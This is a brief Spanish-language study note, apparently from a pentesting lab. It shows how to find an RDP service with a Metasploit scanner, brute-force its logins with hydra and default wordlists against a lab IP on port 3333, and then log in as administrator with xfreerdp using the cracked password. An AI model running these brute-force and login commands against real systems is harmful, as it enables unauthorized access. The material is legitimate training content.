#ActiveDirectory 

Por lo general, el protocolo RDP corre sobre el puerto 3389, pero es posible que corra por otro puerto, por lo que podemos asegurarnos de que un puerto es el RDP con metasploit:
![[Pasted image 20240615211957.png]]

Usaremos el siguiente módulo de metasploit:

```python
use auxiliary_scanner/rdp/rdp_scanner
```

![[Pasted image 20240615212028.png]]

Y ahora con hydra podemos hacer el ataque de fuerza bruta con estos parámetros:

```python
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.2.28.92 -s 3333
```

Y nos encuentra los siguientes usuarios:
![[Pasted image 20240615212052.png]]

Ahora para conectarnos de forma remota, podemos usar una herramienta llamada xfreerdp:

```python
xfreerdp /u:administrator /p:qwertyuiop /v:10.2.28.92:3333
```

![[Pasted image 20240615212110.png]]

Y ya habremos entrado:
![[Pasted image 20240615212117.png]]